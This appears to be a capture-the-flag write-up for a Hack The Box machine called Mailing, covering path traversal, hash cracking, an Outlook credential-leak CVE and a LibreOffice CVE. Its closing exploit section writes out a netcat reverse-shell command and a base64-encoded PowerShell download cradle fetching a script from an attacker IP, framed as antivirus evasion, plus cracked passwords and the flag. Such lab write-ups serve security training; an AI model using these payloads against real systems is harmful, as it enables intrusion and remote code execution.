## Guided:
**Q:** Which mail server is running on the server?<br>
**A:** hMailServer<br>
> (`nmap -sV <IP>`, will indicate the smtp service)

**Q:** What is the relative path on the website that is vulnerable to a path traversal exploit?<br>
**A:** /download.php <br>                   
> (This Why -> `http://mailing.htb/download.php?file=instructions.pdf`)

**Q:** What is the complete path to the configuration file on the hMailServer?<br>
**A:** C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini<br>
> Quick search on google: Where is the hMailServer.ini file located?
> hMailServer. ini is by default located in `C:\Program Files\hMailServer\Bin`<br>    Had to add (x86) since it's 32bit program

**Q:** What is the password for the Administrator user on the mail server?      (extracted via Burp's Repeater)
**A:** homenetworkingadministrator
1. `hash-identifier <hash>` -> (MD5) 
2. `hashcat -m 0 -a 0 hash.txt ~/Downloads/rockyou.txt`<br> |or|  `john --format=raw-md5 admin.txt --wordlist=~/Downloads/rockyou.txt`
> optional: [crackstation](https://crackstation.net/)

**Q:** What is the 2024 CVE ID for a vulnerability Windows Mail client that can lead to the leak of the users credentials?<br>
**A:** CVE-2024-21413 <br>
> A quick search on google for hMailServer exploit revealed this:<br>
> [Exploit](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git)

**Q:** What is the password for the maya user on Mailing?<br>
**A:** m4y4ngs4ri <br>
> I've tried the exploit but didn't work (any of them and alot of people came with the same problem) <br>
> `sudo responder -I eth0` |or| `impacket-smbserver smbFolder $(pwd) -smb2support` <br>
> `python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\<IP>\smbFolder\test.txt" --subject Test` <br>
> had to copy the NTLMv2 hash from some guide online and crack it myself with -->  `hashcat -m 5600 -a 0 <NTLMv2 hash> ~/Downloads/rockyou.txt`

**Q:** What is the version of LibreOffice present on the server?<br>
**A:** 7.4.0.0.1 <br>
> Via PS: `(Get-Command "$env:ProgramFiles\LibreOffice\program\soffice.exe").FileVersionInfo | Select-Object ProductVersion`<br>

**Q:** What is the 2023 CVE-ID for a vulnerability in this version of LibreOffice?<br>
**A:** CVE-2023-2255 <br>
> This vulnerability involves improper access <br>
> control in LibreOffice's editor components,<br> allowing an attacker to create a document that loads <br>
> external links without prompting the user.

**Q:** Submit the flag located on the localadmin user's desktop.<br>
**A:** e59e5729dbc1c2b3cd70cf04b2160f2a<br>
> `C:\Users\localadmin\Desktop>type root.txt`<br>
> `type root.txt`

## The exploit:
1. `python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe YOUR_IP 1337" --output exploit.odt` <br>
2. connect via evil-winrm --> upload to C:\programdata a 'nc.exe'
3. then needed a directory that the user may access it, so it was "C:\Important Documents" --> upload the exploit.odt
4. open netcat listener and wait



Rev-shell with Ippsec method to evade anti-virus via powershell:
                  echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8585/shell.ps1')$" > cradle
convert to 16bit:
                  cat cradle | iconv -t utf-16le | base64 -w 0

Exploit:
  python3 CVE-2023-2255.py --cmd 'cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAMQA6ADgANQA4ADUALwBzAGgAZQBsAGwALgBwAHMAMQAnACkAJAAKAA==' --output exploit.odt


